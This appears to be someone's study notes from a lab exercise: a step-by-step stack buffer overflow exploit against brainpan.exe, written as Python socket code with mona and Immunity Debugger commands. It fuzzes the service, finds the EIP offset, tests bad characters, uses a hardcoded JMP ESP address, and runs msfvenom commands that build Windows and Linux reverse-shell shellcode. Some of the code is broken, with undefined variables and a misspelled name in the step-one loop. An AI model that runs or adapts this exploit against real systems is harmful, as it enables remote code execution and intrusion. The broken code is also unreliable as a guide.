# Buff_Over_flo

    //****buffer overflow steps -- use immunity debugger-open the file, sitting betwin file and attack host, view the ram space of the file running
    //1. code to test how long a input strings will make the app crashed. in 100 byte level
    //2. exactly the longth to EIP (4 bytes), the offset
    //3. check how long strings the ESP can accept, we need almost 400-500 bytes.
    //4. send the paylaod, offset + EIP(the address of ESP) + PAD ("\x90"*16) + shellcode(write to ESP)

    //code for setp1
    buffer =["A"]
    counter = 100

    while len(buffer) <=30:
        buffer.append("A"*counter)
        counter += 100

    for i in buffer:
        buffer = "A"*524 + "\xf3\x12\x17\x31"+ pad + shell
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect(('192.168.56.117',9999))
        s.send(buffer)
        data = s.recv(1024)
        print(len(bufer), "Sent! ")
        s.close()
    //here the length is the value of offset
    
    //step 2 codes
        //buffer > offset ,but < offset +100
        //we tried to sent the length of buffer to get exactly offset, to make B to write on EIP addr
        buffer ="A"*x + "B"*4
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect(('192.168.56.117',9999))
        s.send(buffer)
        data = s.recv(1024)
        s.close()
    
    //step3
        //change buffer = "A"*offset + "B"*4 + "C"*500 (500bytes is enough for revershell )
        //use same code as step2
        // send the bad char strings to test badchar which is not accept by the target software, ohter than \x00
        //the payload is "\x01 -- \xff"
            !mona bytearray -b "\x00"  //used to generate badchar string
    //step4
        buffer = "A"*offset + (the address of ESP) + PAD + shellcode
        //for ESP, we need to map the opcode(operation code) of JMP ESP, that is \xff\xe4.
            //!mona modules (mona.py) -- to check the sofatware is protected or not,  if it is false, we can find the addr os EIP, by find \xff\xe4
            //!mona find -s "\xff\xe4" -m brainpan.exe, we get a addr 311712f3, but the addr in the ram is "\xf3\x12\x17\x31"  //!mona jmp -r esp -cpb "\x00"
            //!mona jmp -r esp -cpb "\x00"  to get esp, that is the first line address
        //  reverse shellcode of bytes format,
            //msfvenom -p windows/shell_reverse_tcp LHOST=xx LPORT=xx EXITFUNC=thread -f c -a x86 -b "\x00" (use to test on win host)
            //msfvenom -p linux/x86/shell_reverse_tcp LHOST=xx LPORT=xx EXITFUNC=thread -f c -a x86 -b "\x00" (use on kali)
